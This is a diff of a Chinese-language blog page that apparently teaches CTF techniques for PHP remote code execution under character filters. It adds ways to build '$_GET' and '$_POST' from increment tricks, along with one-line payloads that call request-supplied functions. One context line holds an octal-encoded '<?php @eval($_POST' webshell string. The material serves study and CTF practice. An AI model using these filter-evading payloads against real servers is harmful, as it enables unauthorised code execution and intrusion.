@@ -226,7 +226,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/RCE/" style="color: #00bcd4">RCE</a>
+                <a href="/blog/tags/RCE/" style="color: #ffa2c4">RCE</a>
             </span>
             
         </span>
@@ -240,7 +240,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">5.7k字</span>
+        <span class="post-count">6k字</span>
       </span>
     </span>
 
@@ -249,7 +249,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">25分</span>
+        <span class="post-count">27分</span>
       </span>
     </span>
     
@@ -642,6 +642,7 @@ $&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\1
 $<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>-1
 <span class="token variable">$&#123;_&#125;</span> <span class="token operator">=</span><span class="token string">""</span>返回上一次命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
+<hr>
 <h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">valid <span class="token operator">=</span> <span class="token string">"1234567890!@$%^*()&#123;&#125;[];\'\",.&lt;>/?-=_`~ "</span>
 
 answer <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#请输入进行异或构造的字符串</span>
@@ -660,9 +661,9 @@ tmp1<span class="token punctuation">,</span> tmp2 <span class="token operator">=
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tmp1为:"</span><span class="token punctuation">,</span>tmp1<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tmp2为:"</span><span class="token punctuation">,</span>tmp2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
-<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>(传入时记得url编码)</p>
+<hr>
+<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>最终我们要把参数带出来，即构造<code>$_GET</code>或<code>$_POST</code></p>
+<p>(传入时记得url编码)</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">++</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>  <code>$_++</code>对<code>_</code>变量进行了自增操作,由于我们没有定义<code>_</code>的值,PHP会给<code>_</code>赋一个默认值NULL&#x3D;&#x3D;0,</p>
@@ -671,6 +672,7 @@ tmp1<span class="token punctuation">,</span> tmp2 <span class="token operator">=
 <li><p>注：linux命令下不能构造<code>($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)</code>类似语句获取数字</p>
 </li>
 <li><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”</p>
+<p>实战一般会用<code>_/_._</code>获取<code>NAN_</code>快速获取<code>$_POST</code></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string double-quoted-string">"A"</span><span class="token operator">++</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token string double-quoted-string">"B"</span>
 <span class="token string double-quoted-string">"B"</span><span class="token operator">++</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token string double-quoted-string">"C"</span>
     如果我们能够得到<span class="token string double-quoted-string">"A"</span>，那么我们就能通过自增自减，得到所有的字母
@@ -681,6 +683,53 @@ tmp1<span class="token punctuation">,</span> tmp2 <span class="token operator">=
 <span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">;</span>   <span class="token comment">// 得到"NAN_"</span>
 <span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//得到"N"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
+<p>以Array为例拼出<code>$_GET</code>：（用到chr函数）长度120</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>   <span class="token comment">// Array</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// r</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// a</span>
+<span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// c</span>
+<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// h</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span>  <span class="token comment">// chr</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// _GET</span>
+<span class="token variable">$$_</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span>；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>精简为一句话版：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$___</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>以NAN为例拼出<code>$_POST</code>：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$NAN</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">/</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token constant">_</span><span class="token punctuation">;</span> <span class="token comment">// NAN_</span>
+<span class="token variable">$N</span> <span class="token operator">=</span> <span class="token variable">$NAN</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// N</span>
+<span class="token variable">$O</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span><span class="token punctuation">;</span> <span class="token comment">// O</span>
+<span class="token variable">$PO</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span> <span class="token operator">.</span> <span class="token variable">$O</span><span class="token punctuation">;</span> <span class="token comment">// PO</span>
+<span class="token variable">$N</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// Q</span>
+<span class="token variable">$N</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span>
+<span class="token variable">$S</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span><span class="token punctuation">;</span> 	<span class="token comment">// S</span>
+<span class="token variable">$T</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span><span class="token punctuation">;</span>	<span class="token comment">// T</span>
+<span class="token variable">$POST</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token variable">$PO</span> <span class="token operator">.</span> <span class="token variable">$S</span> <span class="token operator">.</span> <span class="token variable">$T</span><span class="token punctuation">;</span> <span class="token comment">// _POST</span>
+<span class="token keyword">echo</span> <span class="token variable">$POST</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>简化一下然后换变量名</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$_</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">_</span> <span class="token operator">/</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// N</span>
+<span class="token variable">$__</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// O</span>
+<span class="token variable">$___</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span> <span class="token operator">.</span> <span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// PO</span>
+<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//Q</span>
+<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//R</span>
+<span class="token variable">$____</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$_____</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$POST</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token variable">$___</span> <span class="token operator">.</span> <span class="token variable">$____</span> <span class="token operator">.</span> <span class="token variable">$_____</span><span class="token punctuation">;</span> <span class="token comment">// _POST</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>缩成一句话，长110</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$______</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$___</span><span class="token operator">.</span><span class="token variable">$____</span><span class="token operator">.</span><span class="token variable">$_____</span><span class="token punctuation">;</span><span class="token variable">$$______</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>更短的参考<a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">极限RCE</a></p>
+<hr>
 <h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"><code>$</code>和<code>_</code>均被过滤的情况</a>(P神文章)</p>
 </blockquote>
